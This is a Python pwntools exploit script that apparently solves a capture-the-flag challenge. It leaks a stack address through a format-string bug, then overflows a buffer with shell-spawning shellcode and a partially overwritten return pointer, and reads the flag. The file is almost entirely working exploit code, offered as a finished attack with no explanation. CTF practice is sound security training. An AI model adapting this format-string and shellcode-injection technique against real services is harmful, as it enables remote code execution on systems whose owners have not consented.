#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template a.out
from pwn import *

# Set up pwntools for the correct architecture
CHAL = '/challenge/chal'
exe = context.binary = ELF(args.EXE or CHAL)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
br *makeComment+87
br *lookPost+286
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      No PIE (0x400000)
# Stack:    Executable
# RWX:      Has RWX segments



for i in range(5):
    io = remote('127.0.0.1', 1337)

    # STAGE 1: Leak Memory
    io.sendline(b'2')
    io.sendline(b'%42$p')
    io.recvuntil(b'following:')
    leak = io.recvline()
    leak = io.recvline()
    log.success(hex(int(leak,16)))
    # shellcode = asm(shellcraft.sh())
    rsp = int(leak,16) - 0x130
    log.success("RSP at: " + hex(rsp))

    # STAGE 2: overflow
    # payload = nopsled + shellcode + padding + deadbeef + rsp + ptr to deadbeef (total 257)
    io.recvline()
    io.sendline(b'1')

    ptr_dst = rsp + 0xf0
    last_byte = ptr_dst & 0xff
    log.success('Byte to overflow: ' + hex(last_byte))
    last_byte = last_byte.to_bytes(1,'big')
    #shellcode =  b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"                                    
    shellcode = asm(shellcraft.sh())

    payload = shellcode + 128*asm('NOP') + p64(0xdeadbeef) + p64(rsp + 8) + last_byte 
    payload = (257-len(payload))*asm("NOP") + payload
    io.sendline(payload)

    io.sendline(b"cat flag.txt && exit")
    result = str(io.recvall().decode('ascii'))
    if 'wctf{' in result:
        print(result)
        exit(0)
    else:
        log.info(f'failed {i} times')
        sleep(0.5)
        continue
exit(1)
